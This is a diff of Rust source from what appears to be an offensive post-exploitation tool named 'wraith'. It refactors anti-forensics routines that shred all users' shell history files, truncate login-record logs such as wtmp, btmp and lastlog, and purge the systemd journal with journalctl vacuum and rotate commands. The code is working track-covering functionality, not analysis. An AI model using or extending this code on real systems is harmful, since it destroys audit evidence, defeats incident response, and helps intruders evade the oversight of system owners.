@@ -4,8 +4,7 @@
 
 #[cfg(unix)]
 use std::ffi::CString;
-use std::fs::{self, OpenOptions};
-use std::io::Write;
+use std::fs;
 use std::path::Path;
 use tracing::info;
 use wraith_core::error::Result;
@@ -23,7 +22,7 @@ pub const VOLATILE_LOG_PATHS: &[&str] = &[
     "/var/log/wtmp",
     "/var/log/btmp",
     "/var/log/lastlog",
-    "/var/run/utmp",
+    "/run/utmp",
 ];
 
 pub const SHELL_HISTORY_PATTERNS: &[&str] = &[
@@ -78,7 +77,8 @@ pub fn wipe_all_user_histories() -> Result<usize> {
     for home in target_dirs {
         for pattern in SHELL_HISTORY_PATTERNS {
             let history_file = home.join(pattern);
-            if history_file.exists() && dod_7pass_shred(&history_file).is_ok() {
+            if history_file.exists() {
+                dod_7pass_shred(&history_file)?;
                 shredded_count += 1;
             }
         }
@@ -91,7 +91,8 @@ pub fn wipe_all_user_histories() -> Result<usize> {
             if p.is_dir() {
                 for pattern in SHELL_HISTORY_PATTERNS {
                     let h_file = p.join(pattern);
-                    if h_file.exists() && dod_7pass_shred(&h_file).is_ok() {
+                    if h_file.exists() {
+                        dod_7pass_shred(&h_file)?;
                         shredded_count += 1;
                     }
                 }
@@ -110,26 +111,18 @@ pub fn scrub_system_logs() -> Result<usize> {
     for path_str in VOLATILE_LOG_PATHS {
         let p = Path::new(path_str);
         if p.exists() {
-            if let Ok(mut f) = OpenOptions::new().write(true).truncate(true).open(p) {
-                let _ = f.write_all(b"");
-                let _ = f.sync_all();
-                scrubbed += 1;
-            }
+            crate::shred::truncate_log_file(p)?;
+            scrubbed += 1;
         }
     }
 
     // Clear systemd journal directory if present
     if Path::new("/var/log/journal").exists() {
-        let _ = std::process::Command::new("journalctl")
-            .args(["--vacuum-time=1s"])
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .status();
-        let _ = std::process::Command::new("journalctl")
-            .args(["--rotate"])
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .status();
+        for option in ["--rotate", "--vacuum-time=1s"] {
+            if !std::process::Command::new("journalctl").arg(option).status()?.success() {
+                return Err(wraith_core::error::WraithError::Forensic("Journal cleanup failed".into()));
+            }
+        }
     }
 
     info!("System journal and forensic logs sanitized ({scrubbed} log sinks cleared)");
